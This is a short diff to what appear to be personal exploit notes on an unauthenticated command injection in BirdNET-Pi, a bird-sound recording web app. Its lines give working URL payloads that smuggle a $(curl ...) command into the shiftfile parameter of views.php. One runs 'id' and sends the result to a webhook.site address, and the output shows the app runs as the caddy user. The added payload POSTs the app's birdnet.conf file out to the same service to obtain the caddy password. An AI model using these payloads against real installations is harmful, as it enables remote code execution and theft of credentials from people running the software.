@@ -5,7 +5,11 @@ html:birdnet
 some nice unauth command injection 
 https://github.com/mcguirepr89/BirdNET-Pi/blob/main/scripts/play.php
 
-views.php?view=Recordings&shiftfile=$(curl%20http://webhook.site/6f4e96a2-76b2-4ca6-9c38-bad4e6c7bab0/$(id))
+views.php?view=Recordings&shiftfile=$(curl%20http://webhook.site/xxx/$(id))
 
 uid=999(caddy)
+
+to extract conf and get caddy passwd 
+
+/views.php?view=Recordings&shiftfile=$(curl -X POST http://webhook.site/xx/ -d "$(cat ../../BirdNET-Pi/birdnet.conf)")
 
